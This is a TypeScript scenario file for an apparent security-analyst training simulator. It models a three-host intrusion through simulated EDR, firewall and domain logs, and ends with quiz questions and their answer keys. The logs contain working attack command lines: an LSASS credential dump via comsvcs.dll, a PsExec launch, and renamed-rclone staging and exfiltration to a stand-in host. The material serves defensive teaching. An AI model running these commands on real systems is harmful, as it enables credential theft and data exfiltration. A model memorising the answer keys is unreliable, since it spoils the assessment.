/**
 * Scenario pack: "Multi-Host Intrusion — Foothold, Lateral Move, Staging"
 *
 * ADVANCED tier. A single hands-on-keyboard operator moves across THREE Windows
 * hosts in one evening, on the way to a ransomware deployment that a night-shift
 * analyst interrupts. It is deliberately a MULTI-INCIDENT scenario: each host is
 * its own EDR incident (its own isolated case in the console's Incidents page),
 * and the three are correlated into one campaign by a shared operator, a shared
 * C2 domain, and a tight timeline.
 *
 *   Incident 1 (FIN-WS-08)  — Initial access: a macro-enabled invoice spawns an
 *                             encoded-PowerShell Cobalt Strike beacon. edr.
 *   Incident 2 (FS-SRV-03)  — Lateral move + credential access: PsExec landing,
 *                             then an LSASS MiniDump. hybrid (host + AD logon).
 *   Incident 3 (BKP-SRV-02) — Collection + exfil: a renamed rclone stages the
 *                             finance shares and pushes them out. edr.
 *
 * The learning point is scoping a campaign across hosts: the same operator, the
 * same infrastructure, three separate endpoints — investigated as three EDR cases
 * that a good analyst ties together.
 *
 * SOURCES: edr (CrowdStrike Falcon), firewall (Palo Alto NGFW), ad (Windows
 * Security / Domain Controller).
 *
 * NOTE: register in scenarios.ts with difficulty "advanced".
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

export function buildMultiHostIntrusionScenario(
  scenarioId = "multi-host-intrusion-2026",
): ScenarioBundle {
  const B = new Date("2026-08-19T18:40:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  // One campaign, three host incidents — each its own isolated EDR case.
  const INC_WS = "inc:mhi:ws";    // FIN-WS-08 — initial access
  const INC_FS = "inc:mhi:fs";    // FS-SRV-03 — lateral + credential access
  const INC_BK = "inc:mhi:bkp";   // BKP-SRV-02 — collection + exfil

  const ws  = { hostname: "FIN-WS-08",  ip: "10.20.6.28" };
  const fs  = { hostname: "FS-SRV-03",  ip: "10.20.7.33" };
  const bkp = { hostname: "BKP-SRV-02", ip: "10.20.7.52" };
  const victim = { email: "n.harel@nexacorp.com", sam: "n.harel" };
  const svc = { sam: "svc_backup" };

  const c2 = "cdn-sync-eu.net";
  const c2ip = "45.137.101.22";
  const exfilHost = "store.filedrop-transfer.net";
  const exfilIp = "185.199.53.14";
  const sensorId = "a71c9e0d34b8425fa2c6e5710bd8493f";

  const macroDocHash = makeSha256("multihost_invoice_q3_macro_docm_2026");
  const beaconHash   = makeSha256("multihost_cobalt_beacon_dll_2026");
  const psexecHash   = makeSha256("multihost_psexesvc_service_2026");
  const rcloneHash   = makeSha256("multihost_renamed_rclone_svchost_update_2026");

  const events: TelemetryEvent[] = [
    // ═══════════ INCIDENT 1 — FIN-WS-08 (initial access) ═══════════
    {
      id: "evt_mhi_ws1_download",
      ts: T(0),
      source: "firewall",
      vendor: "Palo Alto Networks PAN-OS",
      event_type: "http_request",
      hostname: ws.hostname,
      user_email: victim.email,
      user_title: "Accounts Payable Clerk",
      src_ip: ws.ip,
      severity: "low",
      incident_id: INC_WS,
      description:
        "FIN-WS-08 downloaded Invoice_Q3_4471.docm from a lookalike supplier portal at 18:40, allowed under the category business-and-economy.",
      file: { name: "Invoice_Q3_4471.docm", path: "/inv/Invoice_Q3_4471.docm", extension: "docm", sha256: macroDocHash },
      network: { url: "https://supplier-invoices-nexa.com/inv/Invoice_Q3_4471.docm", domain: "supplier-invoices-nexa.com", method: "GET", status: 200, bytes_in: 88_320 },
      raw: {
        "pan.type": "THREAT", "pan.subtype": "file", "pan.action": "alert",
        "pan.src": ws.ip, "pan.srcuser": `nexacorp\\${victim.sam}`, "pan.dst": "104.21.9.11", "pan.dport": "443",
        "pan.app": "web-browsing", "pan.category": "business-and-economy",
        "pan.url": "supplier-invoices-nexa.com/inv/Invoice_Q3_4471.docm",
        "pan.filename": "Invoice_Q3_4471.docm", "pan.filetype": "ms-office", "pan.file_hash": macroDocHash,
        "source.ip": ws.ip, "url.domain": "supplier-invoices-nexa.com", "action_result": "alert",
      },
    },
    {
      id: "evt_mhi_ws2_macro_spawn",
      ts: T(3 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: ws.hostname,
      user_email: victim.email,
      src_ip: ws.ip,
      severity: "high",
      mitre_technique: "T1059.003",
      mitre_tactic: "Execution",
      incident_id: INC_WS,
      description: "WINWORD.EXE spawned cmd.exe at 18:43 after the invoice macro was enabled.",
      process: { name: "cmd.exe", pid: 6112, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "WINWORD.EXE", parent_pid: 5044, cmdline: "cmd.exe /c powershell -nop -w hidden -enc SQBFAF...", user: `NEXACORP\\${victim.sam}` },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.sensor.id": sensorId,
        "process.name": "cmd.exe", "process.pid": "6112",
        "process.parent.name": "WINWORD.EXE", "process.parent.pid": "5044",
        "process.command_line": "cmd.exe /c powershell -nop -w hidden -enc SQBFAF...",
        "user.name": `NEXACORP\\${victim.sam}`, "host.name": ws.hostname, "host.ip": ws.ip,
      },
    },
    {
      id: "evt_mhi_ws3_beacon",
      ts: T(3 * MIN + 8 * SEC),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: ws.hostname,
      user_email: victim.email,
      src_ip: ws.ip,
      severity: "critical",
      mitre_technique: "T1059.001",
      mitre_tactic: "Execution",
      incident_id: INC_WS,
      is_detection: true, // alert-grade: encoded PowerShell loading the Cobalt Strike beacon (the foothold crux)
      description: "cmd.exe launched an encoded PowerShell that decoded and injected a Cobalt Strike beacon into memory.",
      process: { name: "powershell.exe", pid: 6180, path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_name: "cmd.exe", parent_pid: 6112, cmdline: "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4A", user: `NEXACORP\\${victim.sam}`, hash: { sha256: beaconHash } },
      raw: {
        "crowdstrike.event_simpleName": "SuspiciousDllLoad",
        "crowdstrike.detection.tactic": "Execution", "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001", "crowdstrike.detection.severity": "Critical",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.sensor.id": sensorId,
        "process.name": "powershell.exe", "process.pid": "6180", "process.parent.name": "cmd.exe", "process.parent.pid": "6112",
        "process.hash.sha256": beaconHash, "process.code_signature.status": "signed",
        "user.name": `NEXACORP\\${victim.sam}`, "host.name": ws.hostname, "host.ip": ws.ip,
      },
    },
    {
      id: "evt_mhi_ws4_c2",
      ts: T(4 * MIN),
      source: "firewall",
      vendor: "Palo Alto Networks PAN-OS",
      event_type: "http_request",
      hostname: ws.hostname,
      user_email: victim.email,
      src_ip: ws.ip,
      severity: "high",
      mitre_technique: "T1071.001",
      mitre_tactic: "Command and Control",
      incident_id: INC_WS,
      description: "FIN-WS-08 began beaconing to cdn-sync-eu.net every 60s with a fixed jitter — a Cobalt Strike malleable C2 profile.",
      network: { url: `https://${c2}/api/v2/heartbeat`, domain: c2, method: "GET", status: 200, bytes_out: 512, bytes_in: 128 },
      raw: {
        "pan.type": "TRAFFIC", "pan.action": "allow", "pan.src": ws.ip, "pan.dst": c2ip, "pan.dport": "443",
        "pan.app": "ssl", "pan.category": "unknown", "pan.url": `${c2}/api/v2/heartbeat`, "pan.repeat_count": "14",
        "source.ip": ws.ip, "url.domain": c2, "action_result": "allow",
      },
    },
    {
      id: "evt_mhi_ws5_alert",
      ts: T(5 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "edr_alert",
      hostname: ws.hostname,
      user_email: victim.email,
      src_ip: ws.ip,
      severity: "critical",
      mitre_technique: "T1059.001",
      mitre_tactic: "Execution",
      incident_id: INC_WS,
      is_detection: true,  // the Falcon detection that opened incident 1
      edr_scope: "edr",    // endpoint-primary foothold → investigate FIN-WS-08 in the EDR console
      description: "Falcon raised a Critical detection on FIN-WS-08: encoded PowerShell decoded an in-memory beacon under WINWORD.EXE, with a repeating TLS heartbeat to external infrastructure.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.detection.name": "EncodedPowerShellBeaconUnderOffice",
        "crowdstrike.detection.severity": "Critical", "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.process_tree": "WINWORD.EXE > cmd.exe > powershell.exe",
        "crowdstrike.network_containment_state": "Not Contained", "crowdstrike.sensor.id": sensorId,
        "host.name": ws.hostname, "host.ip": ws.ip, "user.name": `NEXACORP\\${victim.sam}`,
      },
    },

    // ═══════════ INCIDENT 2 — FS-SRV-03 (lateral + credential access) ═══════════
    {
      id: "evt_mhi_fs1_logon",
      ts: T(19 * MIN),
      source: "ad",
      vendor: "Windows Security",
      event_type: "auth_success",
      hostname: fs.hostname,
      user_email: victim.email,
      src_ip: fs.ip,
      severity: "medium",
      mitre_technique: "T1021.002",
      mitre_tactic: "Lateral Movement",
      incident_id: INC_FS,
      description: "A Type 3 network logon for n.harel arrived on FS-SRV-03 from FIN-WS-08 at 18:59 — the foothold host reaching the file server over SMB.",
      raw: {
        "winlog.event_id": "4624", "winlog.channel": "Security",
        "winlog.event_data.LogonType": "3", "winlog.event_data.TargetUserName": victim.sam,
        "winlog.event_data.IpAddress": ws.ip, "winlog.event_data.WorkstationName": ws.hostname,
        "winlog.computer_name": fs.hostname, "winlog.event_data.AuthenticationPackageName": "NTLM",
      },
    },
    {
      id: "evt_mhi_fs2_psexec",
      ts: T(19 * MIN + 40 * SEC),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: fs.hostname,
      user_email: victim.email,
      src_ip: fs.ip,
      severity: "high",
      mitre_technique: "T1021.002",
      mitre_tactic: "Lateral Movement",
      incident_id: INC_FS,
      description: "services.exe started PSEXESVC.exe on FS-SRV-03, which spawned cmd.exe — a PsExec remote-execution landing.",
      process: { name: "cmd.exe", pid: 4210, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "PSEXESVC.exe", parent_pid: 4188, cmdline: "cmd.exe /c C:\\Windows\\Temp\\d.bat", user: `NEXACORP\\${victim.sam}`, hash: { sha256: psexecHash } },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.sensor.id": sensorId,
        "process.name": "cmd.exe", "process.pid": "4210", "process.parent.name": "PSEXESVC.exe", "process.parent.pid": "4188",
        "process.command_line": "cmd.exe /c C:\\Windows\\Temp\\d.bat",
        "user.name": `NEXACORP\\${victim.sam}`, "host.name": fs.hostname, "host.ip": fs.ip,
      },
    },
    {
      id: "evt_mhi_fs3_lsass",
      ts: T(20 * MIN + 30 * SEC),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_access",
      hostname: fs.hostname,
      user_email: victim.email,
      src_ip: fs.ip,
      severity: "critical",
      mitre_technique: "T1003.001",
      mitre_tactic: "Credential Access",
      incident_id: INC_FS,
      is_detection: true, // alert-grade: the LSASS MiniDump (the credential-theft crux)
      description: "rundll32.exe called comsvcs.dll MiniDump against lsass.exe with full access, writing C:\\Windows\\Temp\\lsass.dmp.",
      process: { name: "rundll32.exe", pid: 4360, path: "C:\\Windows\\System32\\rundll32.exe", parent_name: "cmd.exe", parent_pid: 4210, cmdline: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 712 C:\\Windows\\Temp\\lsass.dmp full", user: `NEXACORP\\${victim.sam}` },
      raw: {
        "crowdstrike.event_simpleName": "ProcessAccessIOC",
        "crowdstrike.detection.tactic": "Credential Access", "crowdstrike.detection.technique": "OS Credential Dumping: LSASS Memory",
        "crowdstrike.detection.technique_id": "T1003.001", "crowdstrike.detection.severity": "Critical",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.GrantedAccess": "0x1FFFFF", "crowdstrike.TargetProcessName": "lsass.exe", "crowdstrike.sensor.id": sensorId,
        "process.name": "rundll32.exe", "process.pid": "4360", "process.parent.name": "cmd.exe", "process.parent.pid": "4210",
        "user.name": `NEXACORP\\${victim.sam}`, "host.name": fs.hostname, "host.ip": fs.ip,
      },
    },
    {
      id: "evt_mhi_fs4_alert",
      ts: T(21 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "edr_alert",
      hostname: fs.hostname,
      user_email: victim.email,
      src_ip: fs.ip,
      severity: "critical",
      mitre_technique: "T1003.001",
      mitre_tactic: "Credential Access",
      incident_id: INC_FS,
      is_detection: true,   // the Falcon detection that opened incident 2
      edr_scope: "hybrid",  // spans the host (LSASS dump) + the AD network logon that delivered the operator — pivot to EDR for FS-SRV-03
      description: "Falcon raised a Critical detection on FS-SRV-03: LSASS memory was dumped via comsvcs.dll MiniDump by a PsExec-launched shell, moments after a network logon from FIN-WS-08.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.detection.name": "LsassMiniDumpViaComsvcs",
        "crowdstrike.detection.severity": "Critical", "crowdstrike.detection.technique_id": "T1003.001",
        "crowdstrike.detection.process_tree": "services.exe > PSEXESVC.exe > cmd.exe > rundll32.exe",
        "crowdstrike.network_containment_state": "Not Contained", "crowdstrike.sensor.id": sensorId,
        "host.name": fs.hostname, "host.ip": fs.ip, "user.name": `NEXACORP\\${victim.sam}`,
      },
    },

    // ═══════════ INCIDENT 3 — BKP-SRV-02 (collection + exfil) ═══════════
    {
      id: "evt_mhi_bk1_stage",
      ts: T(34 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: bkp.hostname,
      src_ip: bkp.ip,
      severity: "high",
      mitre_technique: "T1560.001",
      mitre_tactic: "Collection",
      incident_id: INC_BK,
      description: "svchost-update.exe — an unsigned binary in ProgramData — began recursively archiving \\\\FS-SRV-03\\Finance into 200 MB .r00 volumes on BKP-SRV-02.",
      process: { name: "svchost-update.exe", pid: 7720, path: "C:\\ProgramData\\Adobe\\svchost-update.exe", parent_name: "cmd.exe", parent_pid: 7602, cmdline: "svchost-update.exe copy \\\\FS-SRV-03\\Finance R:\\stage --transfers 16", user: `NEXACORP\\${svc.sam}`, hash: { sha256: rcloneHash } },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.sensor.id": sensorId,
        "process.name": "svchost-update.exe", "process.pid": "7720", "process.parent.name": "cmd.exe", "process.parent.pid": "7602",
        "process.hash.sha256": rcloneHash, "process.code_signature.status": "unsigned",
        "process.original_file_name": "rclone.exe",
        "user.name": `NEXACORP\\${svc.sam}`, "host.name": bkp.hostname, "host.ip": bkp.ip,
      },
    },
    {
      id: "evt_mhi_bk2_exfil_proc",
      ts: T(41 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "net_connection",
      hostname: bkp.hostname,
      src_ip: bkp.ip,
      severity: "critical",
      mitre_technique: "T1567.002",
      mitre_tactic: "Exfiltration",
      incident_id: INC_BK,
      is_detection: true, // alert-grade: the renamed rclone pushing the staged archive to cloud storage (the exfil crux)
      description: "svchost-update.exe opened a sustained TLS session to store.filedrop-transfer.net and transferred the staged R:\\stage volumes — 3.4 GB outbound over 9 minutes.",
      process: { name: "svchost-update.exe", pid: 7720, path: "C:\\ProgramData\\Adobe\\svchost-update.exe", parent_name: "cmd.exe", parent_pid: 7602, cmdline: "svchost-update.exe copy R:\\stage remote:backup --transfers 16", user: `NEXACORP\\${svc.sam}`, hash: { sha256: rcloneHash } },
      network: { domain: exfilHost, method: "PUT", status: 200, bytes_out: 3_650_722_000 },
      dst_ip: exfilIp, dst_port: 443, protocol: "TLS",
      raw: {
        "crowdstrike.event_simpleName": "NetworkConnectIP4", "crowdstrike.sensor.id": sensorId,
        "process.name": "svchost-update.exe", "process.pid": "7720",
        "destination.ip": exfilIp, "destination.port": "443", "destination.domain": exfilHost,
        "host.name": bkp.hostname, "host.ip": bkp.ip, "user.name": `NEXACORP\\${svc.sam}`,
      },
    },
    {
      id: "evt_mhi_bk3_fw",
      ts: T(41 * MIN + 30 * SEC),
      source: "firewall",
      vendor: "Palo Alto Networks PAN-OS",
      event_type: "http_request",
      hostname: bkp.hostname,
      src_ip: bkp.ip,
      severity: "high",
      mitre_technique: "T1567.002",
      mitre_tactic: "Exfiltration",
      incident_id: INC_BK,
      description: "The firewall recorded 3.4 GB of TLS upload from BKP-SRV-02 to store.filedrop-transfer.net, category online-storage-and-backup, allowed.",
      network: { url: `https://${exfilHost}/upload`, domain: exfilHost, method: "PUT", status: 200, bytes_out: 3_650_722_000 },
      raw: {
        "pan.type": "TRAFFIC", "pan.action": "allow", "pan.src": bkp.ip, "pan.dst": exfilIp, "pan.dport": "443",
        "pan.app": "ssl", "pan.category": "online-storage-and-backup", "pan.url": `${exfilHost}/upload`,
        "pan.bytes_sent": "3650722000", "source.ip": bkp.ip, "url.domain": exfilHost, "action_result": "allow",
      },
    },
    {
      id: "evt_mhi_bk4_alert",
      ts: T(43 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "edr_alert",
      hostname: bkp.hostname,
      src_ip: bkp.ip,
      severity: "critical",
      mitre_technique: "T1567.002",
      mitre_tactic: "Exfiltration",
      incident_id: INC_BK,
      is_detection: true,  // the Falcon detection that opened incident 3
      edr_scope: "edr",    // endpoint-primary staging + exfil on BKP-SRV-02 → investigate the host in the EDR console
      description: "Falcon raised a Critical detection on BKP-SRV-02: an unsigned rclone-derived binary archived a file share and transferred multiple gigabytes to an online-storage host.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.detection.name": "MassStagingAndCloudExfil",
        "crowdstrike.detection.severity": "Critical", "crowdstrike.detection.technique_id": "T1567.002",
        "crowdstrike.detection.process_tree": "cmd.exe > svchost-update.exe",
        "crowdstrike.network_containment_state": "Not Contained", "crowdstrike.sensor.id": sensorId,
        "host.name": bkp.hostname, "host.ip": bkp.ip, "user.name": `NEXACORP\\${svc.sam}`,
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "domain", value: c2, first_seen: T(4 * MIN), last_seen: T(4 * MIN), reputation: "malicious", tags: ["c2", "cobalt-strike"] },
    { type: "domain", value: exfilHost, first_seen: T(41 * MIN), last_seen: T(41 * MIN), reputation: "malicious", tags: ["exfil", "cloud-storage"] },
    { type: "sha256", value: beaconHash, first_seen: T(3 * MIN + 8 * SEC), last_seen: T(5 * MIN), reputation: "malicious", tags: ["cobalt-strike", "beacon"] },
    { type: "sha256", value: rcloneHash, first_seen: T(34 * MIN), last_seen: T(43 * MIN), reputation: "malicious", tags: ["rclone", "exfil", "renamed"] },
    { type: "ip", value: c2ip, first_seen: T(4 * MIN), last_seen: T(4 * MIN), reputation: "malicious", tags: ["c2"] },
    { type: "host", value: ws.hostname, first_seen: T(0), last_seen: T(5 * MIN), reputation: "unknown", tags: ["patient-zero", "affected"] },
    { type: "host", value: fs.hostname, first_seen: T(19 * MIN), last_seen: T(21 * MIN), reputation: "unknown", tags: ["lateral", "affected"] },
    { type: "host", value: bkp.hostname, first_seen: T(34 * MIN), last_seen: T(43 * MIN), reputation: "unknown", tags: ["exfil", "affected"] },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt: "Three Falcon detections fired on three different hosts within 40 minutes. What is the strongest evidence they are one campaign rather than three unrelated events?",
      hint: "Follow the account, the timing, and the infrastructure across the three incidents.",
      kind: "single",
      options: [
        { value: "chain", label: "The same account (n.harel) moves FIN-WS-08 → FS-SRV-03 by network logon minutes after the foothold, and the staged data on BKP-SRV-02 comes from FS-SRV-03 — a single actor chaining hosts on one timeline" },
        { value: "same_sev", label: "All three detections are Critical severity, which means they must belong to the same incident" },
        { value: "same_edr", label: "All three came from CrowdStrike Falcon, so they are automatically correlated into one case" },
        { value: "coincidence", label: "Three separate commodity infections happened to land on the same evening" },
      ],
      answer: "chain",
      xp: 60,
      explanation:
        "Correlation across hosts is built from shared entities and a coherent timeline, not from a shared severity or a shared tool. Here n.harel's foothold on FIN-WS-08 (18:43) is followed by a Type-3 logon as n.harel onto FS-SRV-03 from FIN-WS-08 (18:59), an LSASS dump there, and then staging on BKP-SRV-02 that reads \\\\FS-SRV-03\\Finance — each step feeds the next. Same severity (b) and same vendor (c) are true but prove nothing about causation. (d) ignores the account and data flow that tie the hosts together.",
    },
    {
      id: "q2",
      prompt: "You open the EDR console and see three separate incidents. For FS-SRV-03, which single event is the credential-theft that expands the blast radius beyond one workstation?",
      kind: "single",
      options: [
        { value: "lsass", label: "evt_mhi_fs3_lsass — rundll32.exe calling comsvcs.dll MiniDump against lsass.exe with GrantedAccess 0x1FFFFF" },
        { value: "psexec", label: "evt_mhi_fs2_psexec — the PsExec landing that ran cmd.exe" },
        { value: "logon", label: "evt_mhi_fs1_logon — the Type 3 network logon from FIN-WS-08" },
        { value: "alert", label: "evt_mhi_fs4_alert — the Falcon summary detection" },
      ],
      answer: "lsass",
      xp: 50,
      explanation:
        "The MiniDump of LSASS (T1003.001) is what hands the operator every credential cached on FS-SRV-03 — including any privileged or service accounts logged on there — which is exactly how a single-host foothold becomes a domain-wide problem. The PsExec landing (b) is how the operator arrived, the network logon (c) is the lateral step, and the summary alert (d) names the technique but is the vendor's roll-up, not the act itself. GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS) against lsass.exe is the tell.",
    },
    {
      id: "q3",
      prompt: "svchost-update.exe on BKP-SRV-02 is unsigned, sits in C:\\ProgramData\\Adobe, and its process metadata shows original_file_name rclone.exe. What does that combination tell you?",
      kind: "single",
      options: [
        { value: "renamed_rclone", label: "It is rclone renamed to blend in — a legitimate sync tool repurposed as an exfiltration utility, confirmed by the original-file-name mismatch" },
        { value: "adobe", label: "It is a genuine Adobe updater that Falcon misclassified" },
        { value: "svchost", label: "It is the real Windows svchost.exe running from an unusual path" },
        { value: "unknown", label: "Nothing can be concluded without submitting the hash to VirusTotal" },
      ],
      answer: "renamed_rclone",
      xp: 50,
      explanation:
        "The PE's embedded original file name is rclone.exe while the on-disk name is svchost-update.exe — a deliberate rename to look like a Windows/Adobe background task. rclone is a legitimate cloud-sync utility that operators routinely abuse for exfiltration (T1567.002); the unsigned status, the ProgramData\\Adobe path, and the 3.4 GB PUT to an online-storage host complete the picture. (b) and (c) are the disguises the naming is meant to sell; (d) is good practice but the metadata already answers the question here.",
    },
    {
      id: "q4",
      prompt: "You are containing this campaign across all three hosts. Which action set matches the evidence?",
      kind: "single",
      options: [
        { value: "all", label: "Network-contain all three hosts, reset n.harel and every account exposed in the LSASS dump, block the C2 and exfil domains, and treat the finance share data as exfiltrated" },
        { value: "ws_only", label: "Isolate FIN-WS-08 only — it is patient zero, so containing it stops the rest" },
        { value: "block_dns", label: "Block cdn-sync-eu.net and store.filedrop-transfer.net at the firewall; the endpoints are fine once C2 is cut" },
        { value: "reimage", label: "Reimage BKP-SRV-02 to remove the exfil tool; the other hosts had no data loss" },
      ],
      answer: "all",
      xp: 60,
      explanation:
        "By the time you are looking, the operator holds credentials from FS-SRV-03 and has already moved to a third host and pushed data out — so containment has to cover all three hosts at once, invalidate the stolen credentials (a password reset does nothing about a dumped NTLM hash still usable for pass-the-hash, so reset AND monitor/rotate service accounts), and assume the finance share left the building. (b) is false because the operator already pivoted off patient zero using stolen creds. (c) cuts C2 but leaves live credentials and on-host tooling. (d) ignores the credential theft and the foothold on the other two hosts.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Multi-Host Intrusion — Foothold, Lateral Move, Staging",
    threat_actor: "Hands-on-keyboard intrusion operator (pre-ransomware)",
    attack_kind: "multi_host_intrusion",
    briefing:
      "Three CrowdStrike Falcon detections fired on three different hosts — FIN-WS-08, FS-SRV-03 and BKP-SRV-02 — inside 40 minutes tonight. Each opened as its own incident. Work out whether they are one campaign, what the operator took, and how far it spread before you contain it.",
    narrative: `At 18:40 Noa Harel in Accounts Payable opened Invoice_Q3_4471.docm from a lookalike supplier portal and enabled the macro. WINWORD.EXE spawned cmd.exe, which ran an encoded PowerShell that injected a Cobalt Strike beacon; from 18:44 FIN-WS-08 was beaconing to cdn-sync-eu.net. That is incident one.

Fifteen minutes later the operator used Noa's session to reach the file server. A Type-3 logon for n.harel arrived on FS-SRV-03 from FIN-WS-08 at 18:59, PsExec dropped PSEXESVC.exe and a shell, and at 19:00 rundll32.exe called comsvcs.dll MiniDump against lsass.exe with full access, writing lsass.dmp. That is incident two — and it is where a single-workstation problem became a credential problem.

At 19:14 an unsigned binary named svchost-update.exe, living in C:\\ProgramData\\Adobe with an embedded original file name of rclone.exe, began archiving \\\\FS-SRV-03\\Finance on BKP-SRV-02. By 19:21 it had pushed 3.4 GB to store.filedrop-transfer.net. That is incident three.

Falcon raised all three as separate Critical detections. Nothing was contained. The night-shift analyst catches the third alert at 19:23 — before the ransomware stage, but after the data has left.`,
    learning_objectives: [
      "Correlate detections across multiple hosts into a single campaign using shared accounts, timeline, and infrastructure — not shared severity or vendor",
      "Investigate each host as its own EDR incident (its own isolated case) while keeping the campaign view",
      "Recognise LSASS MiniDump via comsvcs.dll (T1003.001) as the step that turns a foothold into a credential-theft blast radius",
      "Identify a renamed legitimate tool (rclone → svchost-update.exe) from an original-file-name mismatch and unsigned status",
      "Scope containment for a multi-host, credential-theft, exfil-complete intrusion — isolate all hosts, invalidate credentials, assume data loss",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: T(3 * MIN), phase: "Initial Access", action: "Macro invoice on FIN-WS-08 spawns cmd → encoded PowerShell (T1204.002 / T1059.003)" },
      { ts: T(3 * MIN + 8 * SEC), phase: "Execution", action: "Cobalt Strike beacon injected in memory (T1059.001)" },
      { ts: T(4 * MIN), phase: "C2", action: `Beacon to ${c2} (T1071.001)` },
      { ts: T(19 * MIN), phase: "Lateral Movement", action: "Type-3 logon FIN-WS-08 → FS-SRV-03; PsExec landing (T1021.002)" },
      { ts: T(20 * MIN + 30 * SEC), phase: "Credential Access", action: "LSASS MiniDump via comsvcs.dll on FS-SRV-03 (T1003.001)" },
      { ts: T(34 * MIN), phase: "Collection", action: "Renamed rclone stages \\\\FS-SRV-03\\Finance on BKP-SRV-02 (T1560.001)" },
      { ts: T(41 * MIN), phase: "Exfiltration", action: `3.4 GB pushed to ${exfilHost} (T1567.002)` },
      { ts: T(43 * MIN), phase: "Detection", action: "Third Falcon detection — analyst intervenes before ransomware" },
    ],
    questions,
  };
}
